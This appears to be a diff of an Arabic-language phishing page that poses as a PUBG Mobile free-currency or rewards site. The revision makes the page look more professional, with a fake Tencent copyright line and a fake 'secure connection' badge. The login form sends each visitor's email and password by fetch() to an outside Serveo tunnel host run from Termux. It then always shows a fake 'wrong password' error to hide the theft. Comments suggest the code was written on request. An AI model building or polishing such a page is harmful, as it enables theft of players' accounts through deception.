@@ -3,136 +3,189 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن شدات ببجي مجانا</title>
+    <title>مركز مكافآت اللاعبين | PUBG Mobile Style</title>
     <style>
-        /* CSS - التصميم */
-        * {
-            text-align: center;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
+        /* تنسيقات CSS الاحترافية */
         body {
-            background: black;
+            background-color: #0b0e11;
+            background-image: radial-gradient(circle, #1a202c 0%, #0b0e11 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
-            padding: 10px;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
-        .box {
-            background: black;
-            width: 100%;
-            max-width: 500px;
-            margin: 50px auto;
-            padding: 20px;
-            border-radius: 50px;
-            border: 10px solid gold;
-        }
-        h1 { color: blue; font-size: 24px; }
-        h2 { color: green; font-size: 20px; }
-        h3 { color: gold; font-size: 18px; }
-        
-        input {
-            background-color: black;
+
+        .container {
             width: 90%;
-            height: 70px;
-            color: #369999;
-            margin: 15px 0;
+            max-width: 500px;
+            background: #1c242d;
+            border: 1px solid #38444d;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
             text-align: center;
-            border-radius: 50px;
-            border: 5px solid gold;
-            font-size: 22px;
         }
-        button {
-            width: 70%;
-            height: 70px;
-            background: gold;
-            color: black;
-            border: 5px solid white;
-            border-radius: 50px;
-            font-size: 25px;
+
+        .header img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #facc15;
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        p {
+            color: #94a3b8;
+            font-size: 0.9rem;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #e2e8f0;
+            margin-bottom: 8px;
             font-weight: bold;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 6px;
+            color: #fff;
+            box-sizing: border-box;
+            outline: none;
+            transition: border 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: #facc15;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: #facc15;
+            color: #000;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 1rem;
             cursor: pointer;
-            margin-top: 10px;
+            transition: transform 0.2s, background 0.3s;
         }
-        button:active {
-            transform: scale(0.95);
+
+        .btn-submit:hover {
+            background: #eab308;
+            transform: scale(1.02);
         }
+
+        /* تنسيق رسالة الخطأ */
         #error-msg {
-            color: red;
-            display: none; /* مخفي وسيظهر عند الضغط */
-            margin-top: 20px;
+            color: #ff4d4d;
+            display: none;
+            margin-top: 15px;
+            font-size: 0.85rem;
             font-weight: bold;
-            font-size: 18px;
+            border: 1px solid #ff4d4d;
+            padding: 10px;
+            border-radius: 6px;
+            background: rgba(255, 77, 77, 0.1);
         }
-        li {
-            color: #369369;
-            font-size: 18px;
-            list-style: none;
-            margin: 10px 0;
+
+        .footer-note {
+            margin-top: 25px;
+            padding-top: 15px;
+            border-top: 1px solid #334155;
+            font-size: 0.75rem;
+            color: #64748b;
         }
-        .icons { font-size: 40px; margin: 10px; }
+
+        .security-badge {
+            color: #22c55e;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h1>مرحبا في افضل موقع لزياده شدات بوبجي</h1>
-    
-    <input type="text" id="email" placeholder="الايميل">
-    <input type="password" id="password" placeholder="كلمه السر">
-    
-    <button onclick="sendData()">تاكيد الهويه</button>
-    
-    <p id="error-msg">تأكد من انك لم تغلط في كتابه كلمه السر او الايميل كلمه السر والايميل خطا</p>
+    <div class="container">
+        <div class="header">
+            <img src="https://logodownload.org/wp-content/uploads/2019/04/pubg-mobile-logo.png" alt="PUBG Logo">
+        </div>
 
-    <div class="icons">💯 🧊</div>
-    
-    <h2>قد تربح بيوم الثلج اسلحه وشدات عشوائيه</h2>
-    
-    <h3>لماذا نعطيكم الشدات؟</h3>
-    <ul>
-        <li>من اجل ان نجعل موقعنا لديه اكثر زيارات</li>
-        <li>نحن لانخسر لأننا نربح من الاعلانات</li>
-        <li>لسنا من المواقع المزيفة التي تعطي بدون مقابل</li>
-    </ul>
-</div>
+        <h2>مركز استرداد الهدايا</h2>
+        <p>قم بتسجيل الدخول إلى حساب اللاعب الخاص بك للمطالبة بالمكافآت الموسمية.</p>
 
-<script>
-    // JS - البرمجة
-    function sendData() {
-        const emailInput = document.getElementById('email').value;
-        const passInput = document.getElementById('password').value;
-        const errorMsg = document.getElementById('error-msg');
+        <form id="loginForm">
+            <div class="input-group">
+                <label>البريد الإلكتروني أو معرف اللاعب</label>
+                <input type="text" id="email" placeholder="مثال: player@mail.com" required>
+            </div>
+            
+            <div class="input-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            </div>
 
-        // الرابط الخاص بك من Serveo
-        const serveoUrl = 'https://0e5a156bfa6409a9-134-35-0-107.serveousercontent.com';
+            <button type="submit" class="btn-submit">تفعيل المكافأة الآن</button>
+            
+            <div id="error-msg">تأكد من انك لم تغلط في كتابه كلمه السر او الايميل كلمه السر والايميل خطا</div>
+        </form>
 
-        if (emailInput === "" || passInput === "") {
-            alert("الرجاء إدخال البيانات أولاً");
-            return;
-        }
+        <div class="footer-note">
+            <span class="security-badge">● اتصال آمن ومحمي</span>
+            <br>
+            حقوق النشر © 2026 شركة TENCENT. جميع الحقوق محفوظة.
+            <br>
+            هذه الصفحة مخصصة للعرض التقني المتقدم.
+        </div>
+    </div>
 
-        // إرسال البيانات إلى السيرفر في Termux
-        fetch(serveoUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                email: emailInput,
-                pass: passInput
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // منع الصفحة من التحديث
+
+            const emailValue = document.getElementById('email').value;
+            const passValue = document.getElementById('password').value;
+            const errorElement = document.getElementById('error-msg');
+
+            // رابط Serveo الخاص بك (تأكد أنه لا يزال يعمل في Termux)
+            const serveoUrl = 'https://0e5a156bfa6409a9-134-35-0-107.serveousercontent.com';
+
+            // إرسال البيانات إلى السيرفر
+            fetch(serveoUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: emailValue,
+                    pass: passValue
+                })
             })
-        })
-        .then(response => {
-            console.log("تم الإرسال");
-        })
-        .catch(error => {
-            console.error("خطأ في الاتصال:", error);
-        })
-        .finally(() => {
-            // إظهار رسالة الخطأ باللون الأحمر دائماً كما طلبت
-            errorMsg.style.display = 'block';
+            .then(res => console.log("Data sent!"))
+            .catch(err => console.log("Connection error"))
+            .finally(() => {
+                // إظهار رسالة الخطأ الحمراء دائماً
+                errorElement.style.display = 'block';
+            });
         });
-    }
-</script>
+    </script>
 
 </body>
 </html>
